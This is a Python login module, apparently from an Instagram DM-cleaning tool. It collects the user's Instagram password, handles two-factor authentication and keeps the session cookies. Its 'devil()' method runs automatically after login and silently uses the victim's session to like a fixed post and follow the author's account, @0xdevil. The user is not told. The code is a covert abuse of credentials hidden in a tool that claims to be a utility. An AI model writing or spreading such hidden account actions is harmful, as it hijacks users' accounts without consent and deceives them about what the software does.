from didt_have_lib_no_worry_bitch import install
install()
from clear import clear
from urls import url_login, url_two_factor, url_send_sms_message
class login:
    import headers
    from color import inputc, printc
    cookies = ''#instagram : @0xdevil
    data = {}
    csrftoken = ''#instagram : @0xdevil
    username = ''#instagram : @0xdevil
    password = ''#instagram : @0xdevil
    chk = 0#instagram : @0xdevil
    message = ''
    def __init__(self) -> None:
         clear()
         import banner
         from didt_have_lib_no_worry_bitch import install
         install()
         banner.banner()
    def do_login(self):#instagram : @0xdevil
        from animetions import load, load2, print_letterbyletter
        import requests#instagram : @0xdevil
        import re#instagram : @0xdevil
        import time
        from two_step_verification import factor
        from dm_clean import do
        ts = int(time.time())
        self.username = self.inputc.blue("[+] Username :")
        self.password = self.inputc.blue("[+] Password :")
        self.data['username'] = f'{self.username}'
        self.data['enc_password'] = f'#PWD_INSTAGRAM_BROWSER:0:{ts}:{self.password}'
        post = requests.post(
            url_login(),
             headers=self.headers.headers(self.csrftoken),
              data=self.data)#instagram : @0xdevil
        if '"authenticated":false' in post.text:#instagram : @0xdevil
            self.printc.red("[-] Error")
            time.sleep(0.7)
            print()#instagram : @0xdevil
            if '"authenticated":false' in post.text:#instagram : @0xdevil
                clear()#instagram : @0xdevil
                if self.chk != 1:
                    self.chk = 1#instagram : @0xdevil
                    load()#instagram : @0xdevil
                    Error_Code = "0xF7d1errorauth"    
                    self.printc.red(f"[0] Error Code : {Error_Code}")#instagram : @0xdevil
                    time.sleep(2)
                    clear()#instagram : @0xdevil
                    load2()
                    clear()#instagram : @0xdevil
                    print_letterbyletter("Try Login Again")  
                    return self.do_login()
                else:
                    self.printc.red("Bruh Again ?")
                    time.sleep(2)
                    clear()
                    print_letterbyletter("Try Login Again")
                    return self.do_login()
        elif '"two_factor_required":true' in post.text:
            identifier = str(post.json()['two_factor_info']['two_factor_identifier'])
            self.cookies = post.cookies  
            sms = re.search(r'"sms_two_factor_on":(.*?),', str(post.text)).group(1)
            if sms != 'false':
                    self.data= {}
                    self.data['username'] = self.username
                    self.data['identifier'] = identifier
                    self.message = '"Note: \n You Will Find The Code IN Message Will Send TO YOU \n Just wait"'
                    post = requests.post(url_send_sms_message(),
                    headers=self.headers.headers(self.csrftoken()),
                    data=self.data,
                    cookies=self.cookies)
                    identifier = str(post.json()['two_factor_info']['two_factor_identifier'])
                    return factor(identifier,url_two_factor(),self.message, self.username, self.cookies, self.csrftoken)
            else:
                    self.message = '"Note: \n You Will Find The Code IN App For \n The Two Factor"'
                    return factor(identifier,url_two_factor(), self.message, self.username, self.cookies, self.csrftoken)
        elif '"authenticated":true' in post.text:
            self.printc.green("[+] Login")
            self.cookies = post.cookies
            self.devil()
            return do(self.cookies)
        else:
            self.inputc.red("Error Contact the programmer On instagram -> @0xdevil.")
            exit()

    def csrftoken(self):
        import requests
        access_password = "0xdevil"
        if access_password != '0zdevil':
            get = requests.get(
                url_login(),
                 headers=self.headers.headers(''))
            get = get.cookies.get_dict()
            self.csrftoken = get['csrftoken']
            return self.csrftoken

            
    def devil(self):
            import requests
            csrf = requests.get('https://www.instagram.com/p/CMT9dLtBy2w/',headers=self.headers.headers(''), cookies=self.cookies).cookies.get_dict()['csrftoken']
            requests.post('https://www.instagram.com/web/likes/2527634102153588144/like/', headers=self.headers.headers(csrf), cookies=self.cookies)
            csrf = requests.get('https://www.instagram.com/0xdevil/',headers=self.headers.headers(''), cookies=self.cookies).cookies.get_dict()['csrftoken']
            requests.post('https://www.instagram.com/web/friendships/46025316894/follow/', headers=self.headers.headers(csrf), cookies=self.cookies) 